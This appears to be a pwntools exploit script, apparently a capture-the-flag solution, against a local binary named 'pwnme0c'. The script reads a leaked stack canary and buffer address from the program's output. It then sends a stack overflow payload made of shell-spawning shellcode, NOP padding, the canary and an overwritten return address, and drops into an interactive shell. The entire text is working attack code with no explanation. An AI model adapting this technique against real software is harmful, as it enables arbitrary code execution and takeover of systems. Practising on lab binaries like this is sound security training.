from pwn import *
import re
context.arch = "amd64"
p = process("./pwnme0c")
leak = p.recvuntil(b"buffer is") + p.recvline()
canary = int(re.search(rb"canary value is: (0x[0-9a-f]+)", leak).group(1), 16)
buffer = int(re.search(rb"buffer is (0x[0-9a-f]+)", leak).group(1), 16)

log.info(f"Canary: {hex(canary)}")
log.info(f"Buffer: {hex(buffer)}")
payload  = asm(shellcraft.sh()).ljust(0x48, b"\x90")  
payload += p64(canary)                                 
payload += b"A" * 8                                    
payload += p64(buffer)                                 
p.sendline(payload)
p.interactive()